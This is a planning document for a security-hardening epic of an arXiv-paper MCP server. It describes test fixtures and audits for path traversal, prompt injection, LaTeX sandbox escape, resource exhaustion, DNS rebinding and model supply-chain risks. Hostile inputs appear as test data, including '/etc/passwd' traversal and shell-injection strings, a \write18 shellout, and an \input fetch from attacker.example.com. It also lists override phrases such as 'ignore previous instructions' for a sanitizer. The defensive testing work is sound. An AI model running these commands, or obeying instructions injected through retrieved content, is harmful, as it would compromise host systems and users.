# E13 — Security Hardening

Epic dependencies: E06_S03 (7-tool surface shipped), E07_S01 (Origin pin), E07_S08 (structured logging scaffolding), E07_S09 (localhost-only binding), E07_S10 (rate limits), E07_S12 (path-traversal regex), E07_S13 (prompt-injection delimiters), E11_S05 (MVCC corpus swap live)

Goal: Consolidated audit-and-completion pass for the seven threats from `.claude/notes/08-security-observability-ops.md` § Threat model. Individual mitigations land as inline acceptance criteria in earlier epics (path-traversal regex in E07_S12, prompt-injection delimiters in E07_S13, rate limits in E07_S10, content-length sanity in E11_S02, Origin pin in E07_S01). E13 is the verification harness: hostile-input fixtures, audit checklists, SBOM generation, model-weight pinning enforcement, and a cumulative threat-model coverage review. All milestone tests run in CI on every PR after E13 lands. E13 gates Tier-5 promotion alongside E11.

Effort: S + S + L + S + S + M + S + S + S + M + S = M total (most milestones are audit + test writing, not net-new implementation)

References: `.claude/notes/08-security-observability-ops.md` lines 1–99 (Threat model, all seven threats); `.claude/notes/06-mcp-server-design.md` lines 350–366 (Spec compliance points)

---

### E13_S01 — Threat-1 audit: paper_id path-traversal coverage across the 7 tools

**Status:** NEW
**Tier:** 5
**Effort:** S
**Dependencies:** E07_S12, E06_S03

**Description.** The canonical 7 tools (`search_papers`, `get_chunk`, `get_paper`, `paper_diff`, `cite_neighbors`, `dependency_graph`, `find_equation`) all accept a `paper_id` or `chunk_id` argument at some layer. The path-traversal regex (`^\d{4}\.\d{4,5}(v\d+)?$` for new-style; `^[a-z\-]+/\d{7}(v\d+)?$` for old-style) was mandated in E07_S12 at the JSON-Schema level. This milestone audits that every entry point in all 7 tools — not just the primary handler — enforces it.

The audit scope is deliberately limited to the 7 tools that constitute the v1 surface. Earlier epic files referenced 9 tools; the correct count per E06_S03 is 7. Any tool added to the surface in a future epic must pass the audit test from this milestone before merging.

Each tool is exercised with three adversarial `paper_id` inputs: `"../../../etc/passwd"`, `"; cat /etc/shadow #"`, and a 512-character overlong string. Every case must produce a JSON-RPC -32602 Invalid Params error without the handler body executing.

**Deliverables.**
- `tests/security/test_path_traversal.py` — parametrised over all 7 tools × 3 adversarial inputs = 21 test cases
- `docs/security/threat-1-audit.md` — per-tool checklist, links to the JSON-Schema definition enforcing the regex

**Acceptance criteria.**
- [ ] `pytest tests/security/test_path_traversal.py` passes: all 21 cases return -32602, no handler body executes
- [ ] `docs/security/threat-1-audit.md` has one row per tool, all ticked
- [ ] Any tool that fails the test gets a fix in the same PR as the audit
- [ ] CI runs `tests/security/test_path_traversal.py` on every PR

**Out of scope.** Tools not in the 7-tool v1 surface. Future `find_lemma_by_name`, `expand_macro`, or any Tier-6+ tool (they must pass the equivalent audit when they land).

**Risk notes.**
- Closes Threat 1 (path traversal) from `.claude/notes/08-security-observability-ops.md` § Threat 1. The mitigation was mandated in E07_S12; this milestone is the proof that it actually covers all 7 entry points.

**Labels.** `area:security`, `kind:infra`, `tier:5`

---

### E13_S02 — Threat-2 audit: prompt-injection delimiter coverage across the 7 tools

**Status:** NEW
**Tier:** 5
**Effort:** S
**Dependencies:** E07_S13, E06_S03

**Description.** Every tool that returns retrieved content must wrap chunk bodies and equation atoms in `<retrieved_chunk>…</retrieved_chunk>` (or `<retrieved_equation>…</retrieved_equation>`) delimiters. This is the primary defense against indirect prompt injection from paper content (`.claude/notes/08-security-observability-ops.md` § Threat 2). E07_S13 mandated the delimiters; this milestone verifies they are present in the response payloads of all 7 tools and adds an optional regex-based sanitization layer for known-bad patterns.

The tools that return retrieved content are: `search_papers` (chunk excerpts), `get_chunk` (full chunk body), `get_paper` (abstract + metadata), `paper_diff` (diff of chunk bodies), `cite_neighbors` (paper abstracts), `dependency_graph` (macro definitions), `find_equation` (equation atom + context sentence). All 7 are in scope.

An optional sanitization layer — controlled by `ARXMCP_SANITIZE_RETRIEVED_CONTENT=1` — strips literal `<|system|>`, `[INST]`, `<|im_start|>`, and the string "ignore previous instructions" from chunk text before wrapping. The layer is configurable and off by default because regex sanitization is not the primary defense (the delimiter contract is) and may strip legitimate LaTeX content in edge cases.

**Deliverables.**
- `tests/security/test_delimiters.py` — asserts every tool response wraps returned content in the correct delimiters
- `server/observability/sanitize.py` — optional sanitization layer; `sanitize_retrieved_text(text: str) -> str`
- `docs/security/threat-2-audit.md` — delimiter contract documentation
- `docs/orchestrator/recommended-system-prompt.md` — recommended orchestrator-side system prompt clause about the `<retrieved_chunk>` boundary

**Acceptance criteria.**
- [ ] `pytest tests/security/test_delimiters.py` passes: every tool's response payload contains the documented delimiter tags around retrieved content
- [ ] Sanitization layer scrubs `<|system|>`, `[INST]`, `<|im_start|>`, and "ignore previous instructions" when `ARXMCP_SANITIZE_RETRIEVED_CONTENT=1`
- [ ] Sanitization is off by default; enabling it is logged at WARN level
- [ ] `docs/orchestrator/recommended-system-prompt.md` committed

**Out of scope.** Semantic detection of injection attempts (an LLM-as-critic approach; explicitly not built per `.claude/notes/09-feature-priorities.md` § Things to explicitly NOT build in v1).

**Risk notes.**
- Closes Threat 2 (indirect prompt injection) from `.claude/notes/08-security-observability-ops.md` § Threat 2.

**Labels.** `area:security`, `kind:research`, `tier:5`

---

### E13_S03 — Threat-3: LaTeXML sandbox hostile-input validation

**Status:** NEW
**Tier:** 5
**Effort:** L
**Dependencies:** E06_S03

**Description.** LaTeX is Turing-complete. A malicious paper can ship `.tex` source designed to consume infinite RAM, write arbitrary files, or attempt to shell out. The LaTeXML subprocess sandbox (hard timeout, rootless container with unprivileged UID, filesystem write whitelist, no network access) was specified in E02_S02 and `.claude/notes/08-security-observability-ops.md` § Threat 3. This milestone proves the sandbox actually holds against a curated set of hostile fixtures.

Five hostile fixture papers are authored in `tests/security/fixtures/latexml/`:
1. `infinite_recursion.tex` — a macro that calls itself until the timeout fires
2. `write18_shellout.tex` — `\write18{cat /etc/passwd > /tmp/pwned.txt}` attempt
3. `fork_bomb.tex` — `\newcommand{\fb}{\fb\fb}` triggered recursively
4. `large_alloc.tex` — allocates a 4 GB buffer via a custom Lua snippet
5. `network_call.tex` — attempts a `\input{http://attacker.example.com/payload.tex}`

For each fixture: the subprocess must terminate within the documented timeout (300 seconds), the host filesystem outside the per-paper output directory must be unmodified, and the paper must be marked `parse_status="parse_failed"` (not a silent success).

On Docker the `--network=none` flag is verified to be present in the compose config and confirmed via `docker inspect`. On macOS the `sandbox-exec` profile (committed to `infra/latexml/sandbox.sb`) must deny network and restrict filesystem writes.

**Deliverables.**
- `tests/security/test_latexml_sandbox.py` — 5 hostile-fixture test cases; each asserts timeout firing, host filesystem clean, parse_status=parse_failed
- `tests/security/fixtures/latexml/` — the 5 `.tex` fixture files
- `infra/latexml/sandbox.sb` — macOS sandbox-exec profile
- `docs/security/threat-3-audit.md` — sandbox configuration documentation

**Acceptance criteria.**
- [ ] `pytest tests/security/test_latexml_sandbox.py` passes (all 5 fixtures contained)
- [ ] Each fixture: subprocess killed ≤ 300 s, host filesystem outside the output dir is unmodified
- [ ] Docker compose config has `--network=none` on the LaTeXML service; verified by `docker inspect`
- [ ] macOS: `sandbox-exec -f infra/latexml/sandbox.sb` profile committed and tested in CI
- [ ] All 5 papers land in `ops/parser-failures/` with `parse_status="parse_failed"`

**Out of scope.** Defending against hostile arXiv content at the network level (Threat 7). Defending against compromised model weights (Threat 6). Custom seccomp profiles for Linux (documented as future hardening in `docs/security/threat-3-audit.md`).

**Risk notes.**
- Closes Threat 3 (LaTeXML on hostile source) from `.claude/notes/08-security-observability-ops.md` § Threat 3. HIGH severity: a successful sandbox escape runs arbitrary code on the developer workstation.
- LaTeXML subprocess must never run inside the MCP server process (which has network access). This separation is load-bearing for containment.

**Labels.** `area:security`, `risk:high`, `tier:5`

---

### E13_S04 — Threat-4 audit: resource-exhaustion limits across the 7 tools

**Status:** NEW
**Tier:** 5
**Effort:** S
**Dependencies:** E07_S10, E06_S07, E06_S08

**Description.** An LLM in a retry loop or under prompt injection can pass `k=10000`, enormous filter lists, or deeply recursive dependency queries. The mitigations — JSON-Schema `maximum` on every numeric parameter, 256 KB byte cap, per-session rate limits — were specified in E06_S07, E06_S08, and E07_S10. This milestone writes fault tests proving each limit holds under adversarial input, covering all 7 canonical tools.

Fault tests verify: `search_papers(k=10000)` is rejected at schema validation; `dependency_graph(depth=100)` is rejected; a filter list with 10,000 authors is rejected; a synthetic result payload that would exceed 256 KB is rewritten to `resource_link`; and 1,500 tool calls within one hour from a single `Mcp-Session-Id` are rate-limited at 1,000 (returning -32005 or equivalent per the rate-limit spec).

**Deliverables.**
- `tests/security/test_resource_exhaustion.py` — covers the 5 fault scenarios above
- `docs/security/threat-4-audit.md` — per-parameter limit table for all 7 tools

**Acceptance criteria.**
- [ ] `pytest tests/security/test_resource_exhaustion.py` passes: all 5 adversarial inputs rejected
- [ ] `k=10000` → -32602 at JSON-Schema validation; handler body not entered
- [ ] `depth=100` → -32602 at JSON-Schema validation
- [ ] 10,000-item filter list → -32602
- [ ] Synthetic 300 KB chunk body → response carries `resource_link`, inline content ≤ 256 KB
- [ ] Rate-limit test: 1,500 calls in 1 hour from one session, limit fires at 1,000

**Out of scope.** Embedder/reranker semaphore exhaustion (covered by startup config in E06_S01). Storage-layer resource limits (disk-full handling in E14_S05).

**Risk notes.**
- Closes Threat 4 (resource exhaustion) from `.claude/notes/08-security-observability-ops.md` § Threat 4.

**Labels.** `area:security`, `tier:5`

---

### E13_S05 — Threat-5 audit: Origin spoofing, DNS-rebinding, and localhost-binding hardening

**Status:** NEW
**Tier:** 5
**Effort:** S
**Dependencies:** E07_S01, E07_S09

**Description.** The server binds to `127.0.0.1:7733` and validates the `Origin` header (E07_S01) and the `Sec-Fetch-Site` header. Even bound to localhost, a malicious local web page can attempt DNS-rebinding attacks (where a `Host` header resolves to a public IP after the initial handshake). This milestone adds tests for these attack vectors and hardens the allow-list configuration.

The hardening additions beyond E07_S01 are: (1) `Sec-Fetch-Site` header rejected unless value is `none` or the header is absent; (2) an `ARXMCP_ALLOWED_ORIGINS` env var that restricts the accepted Origin values (default: empty list, meaning only no-Origin requests — i.e., the stdio shim — are accepted); (3) `Host` header validation rejecting any value that resolves to a non-loopback IP address.

The localhost-binding regression test verifies that setting `ARXMCP_BIND_HOST=0.0.0.0` without `ARXMCP_UNSAFE_NETWORK_BIND=1` causes the server to refuse to start with a clear error message. Inside Docker the server may bind `0.0.0.0` inside the container, but the `ports:` compose mapping must pin the host side to `127.0.0.1:7733`.

**Deliverables.**
- `tests/security/test_origin_binding.py` — 6 test cases: Sec-Fetch-Site enforcement, allowed-origins list, public IP in Host, subdomain rebinding, bind-host refusal, Docker compose mapping
- `docs/security/threat-5-audit.md`
- `docs/security/binding.md` — unsafe-bind documentation with strong warning

**Acceptance criteria.**
- [ ] `Sec-Fetch-Site` header present with value other than `none` → 403
- [ ] Request with a public IP in `Host` header → 403
- [ ] Request with `Host: attacker.localhost` → 403
- [ ] `ARXMCP_BIND_HOST=0.0.0.0` without `ARXMCP_UNSAFE_NETWORK_BIND=1` → server refuses to start
- [ ] Docker compose `ports:` maps `127.0.0.1:7733:7733` (not `0.0.0.0:7733:7733`)
- [ ] `pytest tests/security/test_origin_binding.py` passes all 6 cases

**Out of scope.** Authentication (explicitly out of v1 scope). mTLS (Tier-6+ hardening).

**Risk notes.**
- Closes Threat 5 (Origin spoofing) from `.claude/notes/08-security-observability-ops.md` § Threat 5. E07_S01 ships the basic Origin pin; this milestone is the audit and DNS-rebinding extension.

**Labels.** `area:security`, `area:server`, `tier:5`

---

### E13_S06 — Threat-6: model commit SHA pinning, safetensors-only, and SBOM generation

**Status:** NEW
**Tier:** 5
**Effort:** M
**Dependencies:** E06_S03

**Description.** The embedder (BGE-M3) and reranker (BGE-reranker-v2-m3) are downloaded from Hugging Face. A compromised upload could ship malicious code via custom `modeling_*.py` files or poisoned pickle weights. The mitigations from `.claude/notes/08-security-observability-ops.md` § Threat 6 are: pin model commit SHAs (not just names), load only `.safetensors` weights, and run with `trust_remote_code=False`.

The embedder loader (the component instantiated in E03_S01) must validate that `revision` is a 40-character hex SHA before calling `from_pretrained`. Loading with `revision="main"` or any non-SHA string must raise a `ModelPinningError` with a message listing the required format. The same check applies to the reranker. Both loaders must refuse `.bin` weights at the `from_pretrained` call — pass `use_safetensors=True` and verify the resulting file list contains no `.bin` entries.

The SBOM (Software Bill of Materials) covers both the server image and the ingest image. Use CycloneDX format generated by `cyclonedx-bom` (or `syft`). CI runs `grype` against the SBOM JSON and fails on critical CVEs. The production model commit SHAs for BGE-M3 and BGE-reranker-v2-m3 are documented in `docs/security/threat-6-audit.md` and pinned in `server/config.py` as `DEFAULT_EMBED_SHA` and `DEFAULT_RERANK_SHA` constants.

**Deliverables.**
- `server/embedder/model_loader.py` — updated loader enforcing SHA pinning and safetensors-only
- `server/reranker/model_loader.py` — same
- `tools/sbom.sh` — generates CycloneDX SBOM for `server/` and `ingest/` images
- `.github/workflows/sbom.yml` (or `.gitlab-ci.yml` equivalent) — runs `grype` against the SBOM; fails on critical CVEs
- `docs/security/sbom/` — committed SBOMs for release tags
- `docs/security/threat-6-audit.md` — production model SHAs, SBOM procedure

**Acceptance criteria.**
- [ ] `embedder.load(revision="main")` raises `ModelPinningError`; error message contains the expected SHA format
- [ ] `reranker.load(revision="main")` raises `ModelPinningError`
- [ ] Loading with a valid 40-char SHA succeeds (test with a known-good fixture SHA)
- [ ] Both loaders reject `.bin` weights: `use_safetensors=True` enforced; test with a fixture that has a `.bin` entry
- [ ] `trust_remote_code=False` is the default; enabling it requires `ARXMCP_TRUST_REMOTE_CODE=1` and logs a WARN
- [ ] `tools/sbom.sh` produces valid CycloneDX JSON for both images
- [ ] CI `grype` scan passes (no critical CVEs); critical CVEs cause a CI failure (not just a warning)

**Out of scope.** Pinning the ar5iv cache or OAI-PMH endpoints (Threat 7). Signing the SBOM (Tier-6+ hardening).

**Risk notes.**
- Closes Threat 6 (supply-chain / model weights) from `.claude/notes/08-security-observability-ops.md` § Threat 6. HIGH severity: a backdoored model runs arbitrary code during inference inside the server process.
- The SBOM covers dependency supply-chain risk in addition to model weight risk.

**Labels.** `area:security`, `area:embedder`, `risk:high`, `tier:5`

---

### E13_S07 — Threat-7 audit: source ingestion TLS pinning and content-length enforcement

**Status:** NEW
**Tier:** 5
**Effort:** S
**Dependencies:** E11_S02

**Description.** arXiv source tarballs and ar5iv HTML are fetched over HTTPS. The mitigations are: TLS certificate verification always enabled (default), content-length rejection for payloads > 100 MB, and optional CA fingerprint pinning for the arxiv.org certificate chain. E11_S02 already enforces the 100 MB content-length cap; this milestone audits that TLS verification cannot be disabled via config and adds a regression test for the size cap using a fixture HTTP server.

All HTTP clients in `ingest/sources/` must instantiate a single shared `httpx.Client` (or `httpx.AsyncClient`) configured at module import time. Verifying this is a code-review check backed by a linting rule (grep for `httpx.Client(verify=False)` in CI). The CA-pinning approach is documented as opt-in because the arxiv.org CA chain rotates periodically; forcing a fixed pin creates operational toil without proportionate security benefit at this threat level.

**Deliverables.**
- `tests/security/test_source_ingest.py` — 3 test cases: TLS-disable attempt rejected, 200 MB fixture response rejected, single shared client confirmed
- `docs/security/threat-7-audit.md` — CA-pinning approach, opt-in flag documentation
- CI lint rule: `grep -r "verify=False" ingest/` fails the build

**Acceptance criteria.**
- [ ] `pytest tests/security/test_source_ingest.py` passes all 3 cases
- [ ] TLS verification cannot be disabled via any `ARXMCP_*` env var (config validation rejects it)
- [ ] A fixture HTTP server returning a 200 MB response body is rejected without reading > 100 MB into memory
- [ ] All HTTP clients in `ingest/sources/` use the shared client; grep CI check confirms
- [ ] `docs/security/threat-7-audit.md` documents the CA-pinning approach and `ARXMCP_PIN_ARXIV_CA` flag (opt-in)

**Out of scope.** Content-authenticity verification of fetched papers (out of v1 scope). TLS pinning for the OTel exporter endpoint (E14_S02 concern).

**Risk notes.**
- Closes Threat 7 (source ingestion TLS) from `.claude/notes/08-security-observability-ops.md` § Threat 7.

**Labels.** `area:security`, `area:ingestion`, `tier:5`

---

### E13_S08 — Tool-result and request-input redaction in structured logs

**Status:** NEW
**Tier:** 5
**Effort:** S
**Dependencies:** E07_S08

**Description.** Sensitive fields — full query text, chunk bodies, raw LaTeX, MathML — must not appear in INFO-level or above log lines. They are permitted at DEBUG level only, where the developer has explicitly opted in. A structlog (or Python `logging`) filter implements this: the `RedactionFilter` strips the fields `query`, `body_canonical`, `body_raw_latex`, and `mathml` from any log record emitted at `logging.INFO` or above.

The filter is installed in `server/observability/logging.py::configure()` as part of the logging setup called at server startup. At `ARXMCP_LOG_LEVEL=DEBUG` (which must be set deliberately) these fields are included. At the default `INFO` level they are absent, ensuring that log aggregation pipelines (stdout → Prometheus → OTel) do not inadvertently exfiltrate paper content.

**Deliverables.**
- `server/observability/log_filter.py` — `RedactionFilter` class; `REDACTED_FIELDS = frozenset({"query", "body_canonical", "body_raw_latex", "mathml"})`
- Updated `server/observability/logging.py::configure()` — installs the filter
- `tests/security/test_log_redaction.py` — 2 test cases: INFO-level record lacks sensitive fields; DEBUG-level record contains them
- `docs/observability/log-redaction.md`

**Acceptance criteria.**
- [ ] `pytest tests/security/test_log_redaction.py` passes both cases
- [ ] A log record with `event="search_papers"` and `query="Faltings theorem"` at INFO level has `query` absent from the serialized JSON
- [ ] Same record at DEBUG level includes `query`
- [ ] `body_canonical`, `body_raw_latex`, and `mathml` follow the same pattern

**Out of scope.** Redacting `paper_id` or `chunk_id` (these are identifiers, not sensitive content). PII redaction (not applicable to this system).

**Risk notes.**
- Addresses the "Logging" subsection of `.claude/notes/08-security-observability-ops.md`. A MEDIUM finding: leaking chunk bodies into logs is low-severity for a localhost-only system but is still a privacy concern for draft / pre-publication papers.

**Labels.** `area:observability`, `area:security`, `tier:5`

---

### E13_S09 — Localhost-only binding regression test

**Status:** NEW
**Tier:** 5
**Effort:** S
**Dependencies:** E07_S09

**Description.** The MCP server must bind to `127.0.0.1` by default. Binding to `0.0.0.0` without an explicit unsafe-mode opt-in must cause the server to refuse to start with a clear error message. This regression test prevents future config changes from accidentally opening the server to the local network. It is a companion to E13_S05 (which tests the HTTP-level Origin and Host enforcement); this milestone tests the TCP bind layer.

The test spins up the server config parser with `ARXMCP_BIND_HOST=0.0.0.0` and asserts that `Config.validate()` raises `ConfigError: binding to 0.0.0.0 requires ARXMCP_UNSAFE_NETWORK_BIND=1`. A second test confirms that `ARXMCP_BIND_HOST=0.0.0.0` + `ARXMCP_UNSAFE_NETWORK_BIND=1` is accepted but logs a WARN at startup.

**Deliverables.**
- `tests/security/test_bind_regression.py` — 3 test cases: default 127.0.0.1 accepted; 0.0.0.0 alone rejected; 0.0.0.0 + unsafe flag accepted with WARN
- `docs/security/binding.md` — updated (links from E13_S05)

**Acceptance criteria.**
- [ ] Default config (`ARXMCP_BIND_HOST` unset) binds to `127.0.0.1`
- [ ] `ARXMCP_BIND_HOST=0.0.0.0` without unsafe flag → `ConfigError` before any socket is opened
- [ ] `ARXMCP_BIND_HOST=0.0.0.0` + `ARXMCP_UNSAFE_NETWORK_BIND=1` → accepted, WARN logged
- [ ] `pytest tests/security/test_bind_regression.py` passes all 3 cases

**Out of scope.** IPv6 binding (not in v1 scope). Firewall configuration (environment-specific).

**Risk notes.**
- Complements E13_S05 (HTTP-layer Origin/Host enforcement). Together they close Threat 5 fully.

**Labels.** `area:security`, `area:infra`, `tier:5`

---

### E13_S10 — Cumulative threat-model coverage review

**Status:** NEW
**Tier:** 5
**Effort:** M
**Dependencies:** E13_S01, E13_S02, E13_S03, E13_S04, E13_S05, E13_S06, E13_S07, E13_S08, E13_S09

**Description.** Once E13_S01–S09 have landed, perform a single review pass against `.claude/notes/08-security-observability-ops.md` § Threat model and confirm every documented mitigation is implemented and covered by an automated test. The output is a tracking document that becomes the authoritative reference for the security posture of the v1 system.

The review cross-references each of the 7 threats with: (a) the earliest epic milestone that ships the mitigation, (b) the E13 milestone that audits it, (c) the test file(s) that cover it, and (d) any known gaps filed as follow-up issues. Any gap that surfaces must be filed as a GitLab/GitHub issue and linked from the document before this milestone is considered closed.

**Deliverables.**
- `docs/security/threat-model-coverage.md` — 7-row table, one row per threat, with columns: Threat, Mitigation epic, Audit epic, Test files, Gap issues
- Follow-up issues filed for any gaps (linked from the document)

**Acceptance criteria.**
- [ ] `docs/security/threat-model-coverage.md` committed with all 7 threats covered
- [ ] Every threat has at least one automated test linked in the table
- [ ] Any gap has a filed issue linked in the "Gap issues" column
- [ ] Document reviewed by the developer and committed (not just drafted)

**Out of scope.** Implementing any new mitigations (those belong in gap issues, not this milestone). Penetration testing (Tier-6+ hardening).

**Risk notes.**
- This milestone has no direct threat closure of its own. Its value is preventing the gradual accumulation of unverified security claims as the codebase evolves.

**Labels.** `area:security`, `kind:research`, `tier:5`
